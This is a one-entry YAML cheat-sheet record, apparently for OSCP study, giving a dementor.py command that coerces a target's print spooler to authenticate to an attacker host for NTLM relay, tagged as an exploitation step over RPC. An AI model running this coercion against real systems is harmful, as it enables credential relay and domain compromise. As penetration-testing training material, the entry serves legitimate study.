---
command: |
  uv run dementor.py -u $USER -p $PASSWORD -d $DOMAIN $LHOST $IP
description: Coerce printer spooler authentication from target to attacker (for relay).
os: [Linux]
category: [oscp, cli]
service: [RPC]
phase: [Exploitation]
references:
  - https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc
---
